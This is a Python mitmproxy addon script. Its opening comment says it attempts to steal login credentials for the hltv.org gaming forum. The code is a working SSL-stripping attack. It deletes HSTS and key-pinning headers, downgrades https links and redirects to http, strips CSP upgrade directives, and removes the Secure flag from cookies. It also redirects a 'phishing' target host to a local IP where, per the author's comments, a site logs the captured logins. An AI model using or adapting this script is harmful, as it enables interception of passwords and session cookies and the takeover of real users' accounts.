# Attempts to steal login info for hltv.org, a video game forum.

import re
import urllib.parse

from mitmproxy import http




import logging

from mitmproxy.addonmanager import Loader
# from mitmproxy.log import ALERT

logger = logging.getLogger(__name__)



def load(loader: Loader):
    logger.info("This is some informative text.")
    logger.warning("This is a warning.")
    logger.error("This is an error.")



# set of SSL/TLS capable hosts
secure_hosts: set[str] = set()


def request(flow: http.HTTPFlow) -> None:

    flow.request.headers.pop("If-Modified-Since", None)
    flow.request.headers.pop("Cache-Control", None)

    # do not force https redirection
    flow.request.headers.pop("Upgrade-Insecure-Requests", None)


    # "phishing" anyone trying to visit HLTV
    if flow.request.pretty_host == "example.com":
        flow.request.host = "192.168.10.1"


    # proxy connections to SSL-enabled hosts
    if flow.request.pretty_host in secure_hosts:
        flow.request.scheme = "https"
        flow.request.port = 443

        # We need to update the request destination to whatever is specified in the host header:
        # Having no TLS Server Name Indication from the client and just an IP address as request.host
        # in transparent mode, TLS server name certificate validation would fail.
        flow.request.host = flow.request.pretty_host



# What am I trying to do here?

# ALl HLTV requests redirect to my site.
# Then, the site logs it
# Is it possible to use mitmproxy to log it, too?


def response(flow: http.HTTPFlow) -> None:
    assert flow.response



    logger.info(flow.response)



    flow.response.headers.pop("Strict-Transport-Security", None)
    flow.response.headers.pop("Public-Key-Pins", None)

    # strip links in response body
    flow.response.content = flow.response.content.replace(b"https://", b"http://")

    # strip meta tag upgrade-insecure-requests in response body
    csp_meta_tag_pattern = rb'<meta.*http-equiv=["\']Content-Security-Policy[\'"].*upgrade-insecure-requests.*?>'
    flow.response.content = re.sub(
        csp_meta_tag_pattern, b"", flow.response.content, flags=re.IGNORECASE
    )

    # strip links in 'Location' header
    if flow.response.headers.get("Location", "").startswith("https://"):
        location = flow.response.headers["Location"]
        hostname = urllib.parse.urlparse(location).hostname
        if hostname:
            secure_hosts.add(hostname)
        flow.response.headers["Location"] = location.replace("https://", "http://", 1)

    # strip upgrade-insecure-requests in Content-Security-Policy header
    csp_header = flow.response.headers.get("Content-Security-Policy", "")
    if re.search("upgrade-insecure-requests", csp_header, flags=re.IGNORECASE):
        csp = flow.response.headers["Content-Security-Policy"]
        new_header = re.sub(
            r"upgrade-insecure-requests[;\s]*", "", csp, flags=re.IGNORECASE
        )
        flow.response.headers["Content-Security-Policy"] = new_header

    # strip secure flag from 'Set-Cookie' headers
    cookies = flow.response.headers.get_all("Set-Cookie")
    cookies = [re.sub(r";\s*secure\s*", "", s) for s in cookies]
    flow.response.headers.set_all("Set-Cookie", cookies)

